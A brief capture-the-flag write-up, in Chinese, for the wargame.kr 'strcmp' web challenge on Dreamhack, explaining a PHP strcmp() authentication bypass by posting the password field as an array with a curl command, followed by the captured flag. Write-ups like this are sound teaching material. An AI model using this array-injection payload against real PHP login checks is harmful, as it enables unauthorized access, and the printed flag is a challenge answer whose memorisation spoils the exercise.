---
title: wargame.kr strcmp
published: 2025-02-20
updated: 2025-07-09
description: 'Dreamhack Blitz CTF #9'
image: ''
tags: ["CTF Writeup", "Dreamhack", "Web"]
category: 'Dreamhack'
draft: false 
---


# [wargame.kr]strcmp
題目

> if you can bypass the strcmp function, you get the flag.

![index](/assets/dreamhack/[wargame.kr]strcmp/image.png)

查看原始碼

![source code](/assets/dreamhack/[wargame.kr]strcmp/image-1.png)

這是 PHP strcmp 漏洞，strcmp()在比較兩個字串時，如果相等就會回傳 0，提供 NULL 或 array 可能會讓strcmp() 運行異常。

```sh
curl -X POST http://host1.dreamhack.games:9344/ -d "password[]="
```

![flag](/assets/dreamhack/[wargame.kr]strcmp/image-2.png)

```
DH{aede9e7fa4ccb8225f12040a16bdfd37c0c5d2f0}
```